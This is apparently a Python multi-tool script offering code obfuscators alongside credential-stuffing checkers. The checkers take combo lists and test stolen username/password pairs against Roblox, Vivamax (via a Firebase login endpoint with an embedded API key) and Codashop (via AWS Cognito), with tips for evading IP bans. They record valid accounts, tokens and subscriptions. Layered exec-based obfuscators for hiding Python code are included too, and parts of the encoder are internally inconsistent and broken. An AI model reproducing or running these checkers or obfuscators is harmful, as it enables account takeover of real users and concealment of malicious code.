        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));"
    elif option == 40:
        xx = "b64(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1]"
        heading = "# Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));"
    else:
        sys.exit("\n Invalid Option!")
    
    for x in range(loop):
        try:
            data = "exec((_)(%s))" % repr(eval(xx))
        except TypeError as s:
            sys.exit(f"{fls} TypeError : " + str(s))
    with open(output, 'w') as f:
        f.write(heading + data)
        f.close()


def SEncode(data,output):
    for x in range(5):
        method = repr(b64(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1])
        data = "exec(__import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))))" % method
    z = []
    for i in data:
        z.append(ord(i))
    sata = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z
    with open(output, 'w') as f:
        f.write("exec(str(chr(35)%s));" % '+chr(1)'*10000)
        f.write(sata)
        f.close()
    py_compile.compile(output,output)


def MainMenu():
    try:
        clear()
        banner()
        menu()
        try:
            option = int(eval(_input % f"{tr} Option:{cn} "))
        except ValueError:
            sys.exit(f"\n{fls} Invalid Option !")
        
        if option > 0 and option <= 42:
            if option == 42:
                sys.exit(f"{tr} Thanks For Using this Tool")
            clear()
            banner()
        else:
            sys.exit(f'\n{fls} Invalid Option !')
        try:
            file = eval(_input % f"{tr} File Name : ")
            data = open(file).read()
        except IOError:
            sys.exit(f"\n{fls} File Not Found!")
        
        output = file.lower().replace('.py', '') + '_enc.py'
        if option == 41:
            SEncode(data,output)
        else:
            Encode(option,data,output)
        print(f"\n{tr} Successfully Encrypted %s" % file)
        print(f"\n{tr} saved as %s" % output)
        FileSize(output)
    except KeyboardInterrupt:
        time.sleep(1)
        sys.exit()
        
def run_roblox_checker():
    import requests
    import time
    from datetime import datetime
    from termcolor import colored

    TRISH_LOGO = "⣿⣷ TRISH ROBLOX CHECKER ⣿⣷"

    print(colored(TRISH_LOGO, "cyan", attrs=["bold"]))
    print(colored("            Created by trish\n", "yellow", attrs=["bold"]))

    def parse_date(date_str):
        formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"]
        for fmt in formats:
            try:
                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d")
            except ValueError:
                continue
        return "Unknown Date"

    def get_roblox_user_info(username, password):
        try:
            user_lookup_url = "https://users.roblox.com/v1/usernames/users"
            response = requests.post(user_lookup_url, json={"usernames": [username]})
            response.raise_for_status()
            user_data = response.json().get("data", [])[0]
            user_id = user_data["id"]

            profile = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
            friends = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count").json().get("count", 0)
            followers = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count").json().get("count", 0)
            badges = requests.get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100").json().get("data", [])
            groups = requests.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").json()
            collectibles = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10").json().get("data", [])
            avatar = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png"

            return {
                "USER": username,
                "PASS": password,
                "UserID": user_id,
                "Username": profile.get("name"),
                "DisplayName": profile.get("displayName"),
                "ProfileURL": f"https://www.roblox.com/users/{user_id}/profile",
                "Description": profile.get("description", "N/A"),
                "IsBanned": profile.get("isBanned", False),
                "AccountAgeDays": profile.get("age"),
                "JoinDate": parse_date(profile.get("created")),
                "BadgeCount": len(badges),
                "CollectibleCount": len(collectibles),
                "GroupCount": len(groups),
                "FriendCount": friends,
                "FollowerCount": followers,
                "Avatar": avatar
            }

        except Exception as e:
            print(colored(f"❌ Error fetching {username}: {e}", "red", attrs=["bold"]))
            return None

    file_name = input("Enter file name (user:pass format): ")

    try:
        with open(file_name, "r") as file:
            lines = file.read().splitlines()

        accounts = []

        print(colored("\n🚀 Fetching data...\n", "yellow", attrs=["bold"]))
        for line in lines:
            try:
                username, password = line.split(":", 1)
                accounts.append((username.strip(), password.strip()))
            except ValueError:
                print(colored(f"❌ Invalid format: {line}", "red", attrs=["bold"]))

        output_file_name = "trish_result.txt"
        with open(output_file_name, "w", encoding="utf-8") as output_file:
            for index, (username, password) in enumerate(accounts, start=1):
                print(colored(f"🔍 Checking {index}/{len(accounts)}: {username}...", "yellow", attrs=["bold"]))
                info = get_roblox_user_info(username, password)
                if info:
                    output_file.write("⪻━━━━━═『Trish』═━━━━━⪼\n")
                    for key, val in info.items():
                        output_file.write(f"[+] {key}: {val}\n")
                        print(colored(f"[+] {key}: {val}", "green", attrs=["bold"]))
                    output_file.write("⪻━━━━━━━━━━━━━━━━━━━⪼\n\n")
                    print(colored("⪻━━━━━━━━━━━━━━━━━━━⪼", "cyan", attrs=["bold"]) + "\n")
                else:
                    print(colored(f"❌ Failed to fetch info for: {username}", "red", attrs=["bold"]))
                time.sleep(0.1)

        print(colored(f"\n✅ Done! Results saved in '{output_file_name}'.", "green", attrs=["bold"]))

    except FileNotFoundError:
        print(colored("❌ Error: File not found!", "red", attrs=["bold"]))
    except Exception as e:
        print(colored(f"❌ Unexpected error: {e}", "red", attrs=["bold"]))
        
def run_ascii_generator():
    from datetime import datetime
    import pyfiglet

    # 20 figlet font names
    figlet_fonts = [
        'block', 'bubble', 'big', 'chunky', 'colossal',
        'cosmic', 'doom', 'drpepper', 'isometric1', 'larry3d',
        'nancyj', 'rounded', 'starwars', 'tarty1', 'tarty2',
        'slant', 'smslant', '3-d', '5lineoblique', 'alphabet'
    ]

    # 20 block styling maps
    block_styles = [
        {"█": "▒", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▓", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "■", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▌", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▐", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▇", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "█", "▀": "▲", "▄": "▼", "░": "░"},
        {"█": "▒", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▓", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "░", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▉", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▊", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▂", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▓", "▀": "▲", "▄": "▼", "░": "░"},
        {"█": "█", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▒", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▓", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "■", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▌", "▀": "▀", "▄": "▄", "░": "░"},
        {"█": "▇", "▀": "▀", "▄": "▄", "░": "░"}
    ]

    # 20 box styles for border decorations
    box_styles = [
        ("┌", "─", "┐", "│", "└", "┘"),
        ("╔", "═", "╗", "║", "╚", "╝"),
        ("▛", "▀", "▜", "▌", "▙", "▟"),
        ("+", "-", "+", "|", "+", "+"),
        ("╭", "─", "╮", "│", "╰", "╯"),
        ("█", "▀", "█", "█", "█", "█"),
        ("*", "*", "*", "*", "*", "*"),
        ("#", "#", "#", "#", "#", "#"),
        ("=", "=", "=", "|", "=", "="),
        ("⎡", "⎺", "⎤", "⎪", "⎣", "⎦"),
        ("【", "=", "】", "║", "【", "】"),
        ("🭽", "▔", "🭾", "▏", "🭼", "🭿"),
        ("╒", "═", "╕", "│", "╘", "╛"),
        ("↘", "⬒", "↙", "⬓", "⬘", "⬙"),
        ("❲", "═", "❳", "║", "❲", "❳"),
        ("🡠", "🡆", "🡄", "🡇", "🡄", "🡆"),
        ("🭁", "🭀", "🭃", "🭂", "🭅", "🭄"),
        ("║", "═", "║", "║", "║", "║"),
        ("┏", "━", "┓", "┃", "┗", "┛"),
        ("🞔", "🞔", "🞔", "🞔", "🞔", "🞔")
    ]

    base_font = {
        'A': ["█▀▀█", "█░░█", "█▄▄█"],
        'B': ["█▀▀▄", "█▀▀▄", "█▄▄▀"],
        'C': ["█▀▀█", "█░░░", "█▄▄█"],
        'D': ["█▀▀▄", "█░░█", "█▄▄▀"],
        'E': ["█▀▀", "█▀▀", "█▄▄"],
        'F': ["█▀▀", "█▀▀", "█░░"],
        'G': ["█▀▀█", "█░▄▄", "█▄▄█"],
        'H': ["█░░█", "█▀▀█", "█░░█"],
        'I': ["█", "█", "█"],
        'J': ["░░█", "░░█", "█▄█"],
        'K': ["█░█", "█▀░", "█░█"],
        'L': ["█░░", "█░░", "█▄▄"],
        'M': ["█▄░▄█", "█▒█▒█", "█░█░█"],
        'N': ["█▄░█", "█▒██", "█░▀█"],
        'O': ["█▀▀█", "█░░█", "█▄▄█"],
        'P': ["█▀▀█", "█▀▀▀", "█░░░"],
        'Q': ["█▀▀█", "█░░█", "█▀▀▀"],
        'R': ["█▀▀█", "█▀▀▄", "█░░█"],
        'S': ["█▀▀█", "█▀▀▄", "█▄▄█"],
        'T': ["▀█▀", "░█░", "░█░"],
        'U': ["█░░█", "█░░█", "█▄▄█"],
        'V': ["█░░█", "█░░█", "░▀▀░"],
        'W': ["█░░░█", "█▄█▄█", "█░▀░█"],
        'X': ["█░░█", "░▀▄▀", "█░░█"],
        'Y': ["█░░█", "░▀▄▀", "░░█░"],
        'Z': ["▀▀█", "░█░", "█▄▄"],
        ' ': ["░", "░", "░"]
    }

    def render_block(text, style_map):
        lines = ["", "", ""]
        for char in text.upper():
            char = char if char in base_font else ' '
            for i in range(3):
                line = base_font[char][i]
                for src, dst in style_map.items():
                    line = line.replace(src, dst)
                lines[i] += line + " "
        return lines

    def boxify(lines, box):
        tl, hr, tr, vr, bl, br = box
        width = max(len(line) for line in lines)
        output = [f"{tl}{hr * (width + 2)}{tr}"]
        for line in lines:
            output.append(f"{vr} {line.ljust(width)} {vr}")
        output.append(f"{bl}{hr * (width + 2)}{br}")
        return "\n".join(output)

    name = input("What name do you want to make ASCII: ").strip()
    output_file = "result.txt"

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(f"ASCII Styles for: {name}\n")
        f.write(f"Generated at: {datetime.now()}\n")
        f.write("=" * 60 + "\n\n")

    # Custom block styles (1–20)
    for i in range(20):
        block_style = block_styles[i]
        box_style = box_styles[i]
        lines = render_block(name, block_style)
        boxed = boxify(lines, box_style)

        with open(output_file, "a", encoding="utf-8") as f:
            f.write(f"[{i+1}] Style: Custom Block Unicode\n\n")
            f.write(boxed + "\n")
            f.write("-" * 60 + "\n\n")

    # Figlet styles (21–40)
    for i, font in enumerate(figlet_fonts, start=21):
        try:
            result = pyfiglet.figlet_format(name, font=font)
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(f"[{i}] Style: Figlet ({font})\n\n")
                f.write(result + "\n")
                f.write("-" * 60 + "\n\n")
        except:
            continue

    input("✅ Done! 40 styles saved to result.txt — Press Enter to exit...")
  
def run_proxy_checker():
    import requests
    import threading
    import time
    import random
    from queue import Queue

    print("===================================")
    print("     SOCKS5 PROXY GENERATOR & CHECKER")
    print("===================================")

    while True:
        try:
            limit = int(input("Enter number of proxies to fetch (1-100): "))
            if 1 <= limit <= 100:
                break
            else:
                print("❌ Please enter a number between 1 and 100.")
        except ValueError:
            print("❌ Invalid input. Enter a valid number.")

    proxy_queue = Queue()
    lock = threading.Lock()
    valid_file = open("valid_proxy.txt", "w")
    dead_file = open("dead_proxy.txt", "w")

    def fetch_proxies():
        try:
            print("📥 Fetching proxies...")
            response = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
            proxy_list = response.text.strip().split("\r\n")
            proxies = random.sample(proxy_list, min(limit, len(proxy_list)))
            for proxy in proxies:
                proxy_queue.put(proxy)
            print(f"✅ {len(proxies)} proxies fetched.")
        except Exception as e:
            print("❌ Failed to fetch proxies:", e)

    def check_proxy():
        while not proxy_queue.empty():
            proxy = proxy_queue.get()
            try:
                proxies = {
                    "http": f"socks5://{proxy}",
                    "https": f"socks5://{proxy}"
                }
                r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
                if r.status_code == 200:
                    with lock:
                        print(f"{proxy} ⌛ ALIVE")
                        valid_file.write(proxy + "\n")
                else:
                    with lock:
                        print(f"{proxy} ⌛ DEAD")
                        dead_file.write(proxy + "\n")
            except:
                with lock:
                    print(f"{proxy} ⌛ DEAD")
                    dead_file.write(proxy + "\n")

    fetch_proxies()
    threads = []

    for _ in range(30):  # Use 30 threads
        t = threading.Thread(target=check_proxy)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    valid_file.close()
    dead_file.close()
    print("\n✅ Done checking proxies!")
    print("🟩 Alive proxies saved in valid_proxy.txt")
    print("🟥 Dead proxies saved in dead_proxy.txt")
    input("Press Enter to return to main menu...")
    main_menu()
  
def run_duplicate_remover():
    def print_banner():
        banner = """
╔═══════════════════════════════════════════════════════════╗
║   This script removes duplicate lines from any TXT file   ║
║   Works on any .txt or text-based file — super fast!      ║
║                                                           ║
║   Script made by -trish ❤️                                 ║
╚═══════════════════════════════════════════════════════════╝
"""
        print(banner)

    print_banner()
    filename = input("Enter name of .txt file to clean: ").strip()

    try:
        with open(filename, 'r', encoding='utf-8') as file:
            lines = file.readlines()

        seen = set()
        unique_lines = []
        duplicate_found = False

        for line in lines:
            clean_line = line.strip()
            if clean_line not in seen:
                seen.add(clean_line)
                unique_lines.append(clean_line)
            else:
                print("Duplicate found ✨✅")
                duplicate_found = True

        with open("no_dup.txt", 'w', encoding='utf-8') as out:
            for line in unique_lines:
                out.write(line + '\n')

        if duplicate_found:
            print("✅ Duplicates removed successfully. Saved to no_dup.txt!")
        else:
            print("✨ No duplicates found. File was already clean!")

    except FileNotFoundError:
        print("❌ File not found. Please check the name and try again.")

    input("Press Enter to return to main menu...")
    main_menu()
 
def run_codm_separator():
    import os
    import re
    from datetime import datetime
    from colorama import Fore, Style

    EXPIRATION_DATETIME = "2027-02-23 11:05:00 PM"

    def check_expiration():
        current_datetime = datetime.now()
        expiration_datetime = datetime.strptime(EXPIRATION_DATETIME, "%Y-%m-%d %I:%M:%S %p")
        if current_datetime > expiration_datetime:
            print(Fore.RED + f"The script has expired as of {EXPIRATION_DATETIME}.")
            input("Press Enter to return...")
            return

    def display_logo():
        logo = """
+-------------------------------------------------+
|           CODM ACCOUNT LEVEL SEPARATOR          |
+-------------------------------------------------+
"""
        small_text = """
Made by: TRISH
TG: 
"""
        print(Fore.CYAN + Style.BRIGHT + logo)
        print(Fore.GREEN + Style.BRIGHT + small_text)
        print(Style.RESET_ALL)

    def process_codm_accounts(input_file):
        try:
            with open(input_file, 'r', encoding='utf-8') as f:
                raw = f.read()

            entries = raw.split("---------------------[ NEXT ]----------------------")
            fifty_to_ninety_nine = []
            hundred_plus = []
            failed = 0

            for entry in entries:
                match = re.search(r"Account Level:\s*(\d+)", entry)
                if match:
                    level = int(match.group(1))
                    if 50 <= level <= 99:
                        fifty_to_ninety_nine.append(entry.strip())
                    elif 100 <= level <= 400:
                        hundred_plus.append(entry.strip())
                else:
                    failed += 1

            base_dir = os.path.dirname(input_file)

            with open(os.path.join(base_dir, "50-99.txt"), 'w', encoding='utf-8') as out1:
                out1.write("\n\n---------------------[ NEXT ]----------------------\n\n".join(fifty_to_ninety_nine))

            with open(os.path.join(base_dir, "100-400.txt"), 'w', encoding='utf-8') as out2:
                out2.write("\n\n---------------------[ NEXT ]----------------------\n\n".join(hundred_plus))

            print(Fore.MAGENTA + Style.BRIGHT + "\nProcessing Complete!" + Style.RESET_ALL)
            print(Fore.GREEN + f"Total Level 50–99: {len(fifty_to_ninety_nine)}")
            print(Fore.GREEN + f"Total Level 100–400: {len(hundred_plus)}")
            print(Fore.RED + f"Total Failed: {failed}")
            print(Fore.CYAN + "Saved to:")
            print(Fore.CYAN + f"  ➤ 50-99.txt")
            print(Fore.CYAN + f"  ➤ 100-400.txt")

        except FileNotFoundError:
            print(Fore.RED + f"The file {input_file} was not found.")
        except Exception as e:
            print(Fore.RED + f"An error occurred: {e}")

    check_expiration()
    display_logo()
    filename = input(Fore.YELLOW + "Enter CODM file name: ")
    process_codm_accounts(filename)
    input(Fore.GREEN + "\nPress Enter to return to main menu..." + Style.RESET_ALL)
    main_menu()

import os
import base64
import random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from colorama import Fore, Style, init

init(autoreset=True)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def banner():
    print("\n" + "=" * 60)
    print(" 🔐 TRISH-CRYPT 20x AES+XOR+BASE64 + Obfuscation + Anti-Bot 🔐 ")
    print("=" * 60 + "\n")


def _trishkey():
    return SHA256.new(b"defaulttrishpassword").digest()


def _trishxor(b, k=b"defaulttrisgpassword"):
    return bytes([x ^ k[i % len(k)] for i, x in enumerate(b)])


def _trishenc_layer(data):
    cipher = AES.new(_trishkey(), AES.MODE_ECB)
    xored = _trishxor(data)
    padded = pad(xored, AES.block_size)
    return base64.b64encode(cipher.encrypt(padded))


def _rev(txt):
    return txt[::-1]


def _rot13(txt):
    res = []
    for c in txt:
        if 'a' <= c <= 'z':
            res.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= c <= 'Z':
            res.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
        else:
            res.append(c)
    return ''.join(res)


def _unicode_shift(txt, offset=3):
    return ''.join(chr((ord(c) + offset) % 0x10FFFF) for c in txt)


def _generate_fake_trap(n):
    return f"""
# 🚫 FAKE TRAP LAYER {n}
if random.randint(1, 1000) == 500:
    raise Exception("⚠️ Fake trap triggered.")
"""


def _trishcrypt_and_save(input_file, layers=20):
    if not os.path.exists(input_file):
        print(f"❌ File not found: {input_file}")
        return

    with open(input_file, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    data = _unicode_shift(_rot13(_rev(content))).encode()

    print(f"⚙️ Encrypting {layers} layers, please wait...")
    for i in range(layers):
        print(f"🔁 Layer {i + 1}/{layers}", end='\r')
        data = _trishenc_layer(data)
    print("\n✅ Encryption done.")

    encoded = data.decode()

    decrypt_code = '''
import base64, random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import unpad

def _trishkey():
    return SHA256.new(b"defaulttrishpassword").digest()

def _trishxor(b, k=b"defaulttrishpassword"):
    return bytes([x ^ k[i % len(k)] for i, x in enumerate(b)])

_trishdata = """''' + encoded + '"""\n'

    for i in range(layers):
        if random.random() > 0.5:
            decrypt_code += _generate_fake_trap(i + 1)
        decrypt_code += f'''
# -- Layer {i + 1}
_trishdata = base64.b64decode(_tridata)
cipher = AES.new(_trikey(), AES.MODE_ECB)
decrypted = cipher.decrypt(_tridata)
unpadded = unpad(decrypted, AES.block_size)
_tridata = _trixor(unpadded).decode()
'''

    decrypt_code += '''
# 🔁 Reverse Unicode Shift
_tridata = ''.join(chr((ord(c) - 3) % 0x10FFFF) for c in _trudata)

# 🔁 Reverse string
_tridata = _tridata[::-1]

# 🔁 Reverse ROT13
def _rot13(t):
    r = []
    for c in t:
        if 'a' <= c <= 'z':
            r.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= c <= 'Z':
            r.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
        else:
            r.append(c)
    return ''.join(r)

_tridata = _rot13(_tridata)
exec(_tridata)
'''

    with open("enc_result.py", "w", encoding="utf-8") as f:
        f.write("#tri_lang_malakas_malakepaburat_pa_\n" * 1000)
        f.write(decrypt_code)

    print("✅ Output saved to: enc_result.py")


def run_anti_reverse_encoder():
    banner()
    file = input("📂 Enter .py file to encrypt: ").strip()
    _tricrypt_and_save(file, layers=20)
    input("Press Enter to return to main menu...")
    main_menu()

import re
import requests
import time
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
init(autoreset=True)

def validate_credentials_format(creds):
    try:
        email, password = creds.split(':')
        return email, password
    except ValueError:
        return None, None

def process_creds(creds):
    ua = UserAgent()
    email, password = validate_credentials_format(creds)
    if not email or not password:
        return None

    viva_payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://vivamax.net",
        "referer": "https://vivamax.net/",
        "user-agent": ua.random,
        "x-client-version": "Chrome/JsCore/8.10.1/FirebaseCore-web"
    }

    try:
        response = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
            json=viva_payload,
            headers=headers,
            timeout=10
        )

        if response.status_code == 200:
            data = response.json()
            id_token = data.get("idToken", "")
            refresh_token = data.get("refreshToken", "")
            local_id = data.get("localId", "N/A")
            email_verified = data.get("emailVerified", False)
            display_name = data.get("displayName", "N/A")
            registered = data.get("registered", False)

            created_at = last_login = "N/A"
            try:
                acc_info_res = requests.post(
                    "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
                    json={"idToken": id_token},
                    headers=headers,
                    timeout=10
                )
                if acc_info_res.status_code == 200:
                    users = acc_info_res.json().get("users", [{}])[0]
                    created_at = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(int(users.get("createdAt", "0")) / 1000))
                    last_login = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(int(users.get("lastLoginAt", "0")) / 1000))
            except:
                pass

            sub_status = "N/A"
            sub_expiry = "N/A"
            try:
                sub_headers = {
                    "authorization": f"Bearer {id_token}",
                    "user-agent": "Vivamax/2.54.0 (Android 11; Mobile; LG-H870) AppleWebKit/537.36",
                    "accept": "application/json",
                    "x-device-platform": "android",
                    "x-app-version": "2.54.0",
                    "x-device-model": "LG-H870",
                    "x-device-id": "f0000000-0000-0000-0000-000000000000"
                }
                sub_res = requests.get(
                    "https://api.vivamax.net/v1/users/me/subscription",
                    headers=sub_headers,
                    timeout=10
                )
                if sub_res.status_code == 200:
                    sub_data = sub_res.json()
                    sub_status = sub_data.get("status", "Unknown")
                    expires_at = sub_data.get("expires_at")
                    if expires_at:
                        sub_expiry = expires_at.replace("T", " ").split("+")[0]
                elif sub_res.status_code == 404:
                    sub_status = "No subscription"
                elif sub_res.status_code == 401:
                    sub_status = "Unauthorized (token rejected)"
                else:
                    sub_status = f"Failed (HTTP {sub_res.status_code})"
            except Exception as e:
                print(f"{Fore.RED}[DEBUG] Subscription fetch failed: {e}{Fore.RESET}")

            result = (
                f"VALID: {email}:{password}\n"
                f" ├─ Display Name   : {display_name}\n"
                f" ├─ Email Verified : {email_verified}\n"
                f" ├─ Local ID       : {local_id}\n"
                f" ├─ Registered     : {registered}\n"
                f" ├─ Token (short)  : {id_token[:15]}...\n"
                f" ├─ Refresh Token  : {refresh_token[:10]}...\n"
                f" ├─ Created At     : {created_at}\n"
                f" ├─ Last Login     : {last_login}\n"
                f" ├─ Subscription   : {sub_status}\n"
                f" └─ Expiry Date    : {sub_expiry}"
            )

            print(Fore.GREEN + result + Fore.RESET)

            with open('vivamax_valid.txt', 'a', encoding='utf-8') as f:
                f.write(result + '\n\n')

            if sub_status.lower() == "active" and sub_expiry != "N/A":
                with open('vivasubs_success.txt', 'a', encoding='utf-8') as sf:
                    sf.write(result + '\n\n')

            return result

        else:
            print(f"{Fore.RED}INVALID: {email}:{password}{Fore.RESET}")
            return None

    except Exception as e:
        print(f"{Fore.RED}ERROR: {email}:{password} - {str(e)}{Fore.RESET}")
        return None

def extract_credentials(input_file):
    email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b:[^:]+$')
    unique_pairs = set()
    for line in input_file:
        match = email_pattern.search(line.strip())
        if match:
            pair = match.group()
            if pair not in unique_pairs:
                unique_pairs.add(pair)
                yield pair

def vivacheck(input_filename):
    try:
        with open(input_filename, 'r', encoding='utf-8', errors='ignore') as input_file:
            creds_list = list(extract_credentials(input_file))

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_creds, creds) for creds in creds_list]
            _ = [f.result() for f in as_completed(futures)]

    except Exception as e:
        print(f"Error: {str(e)}")


import requests
import json
import os
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from collections import defaultdict
import threading

# ──────── Codashop Checker Shared State ──────── #
country_map = {
    '608': 'Philippines',
    '360': 'Indonesia',
    '702': 'Singapore',
    '458': 'Malaysia',
    '764': 'Thailand',
    '704': 'Vietnam'
}

country_count = defaultdict(int)
country_max_balance = defaultdict(float)
lock = threading.Lock()

# ──────── Codashop Checker Functions ──────── #
def load_combos():
    path = input(f"{Fore.YELLOW}[+] Enter combo file (username:password): {Style.RESET_ALL}")
    if not os.path.isfile(path):
        print(f"{Fore.RED}[-] File not found!{Style.RESET_ALL}")
        exit()
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if ':' in line]

def get_country(code):
    return country_map.get(str(code), f"Unknown-{code}")

def wait_for_internet():
    while True:
        try:
            requests.get("https://www.google.com", timeout=5)
            return
        except:
            time.sleep(3)

def validate_account(combo):
    global country_count, country_max_balance
    while True:
        try:
            username, password = combo.split(':')
            auth_url = "https://cognito-idp.ap-southeast-1.amazonaws.com/"
            auth_headers = {
                "User-Agent": "Mozilla/5.0",
                "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
                "Content-Type": "application/x-amz-json-1.1"
            }
            auth_payload = {
                "AuthFlow": "USER_PASSWORD_AUTH",
                "ClientId": "437f3u0sfh7h0av5rlrrjdtmsb",
                "AuthParameters": {
                    "USERNAME": username,
                    "PASSWORD": password
                }
            }

            res = requests.post(auth_url, headers=auth_headers, json=auth_payload, timeout=10)
            text = res.text

            if "TooManyRequestsException" in text or "ForbiddenException" in text:
                print(f"{Fore.RED}[!] IP BAN detected — turn ON airplane mode to change IP then press ENTER to continue...{Style.RESET_ALL}")
                input()
                continue

            if '"TokenType":"Bearer"' not in text:
                print(f"{Fore.RED}[-] INVALID: {combo}{Style.RESET_ALL}")
                return

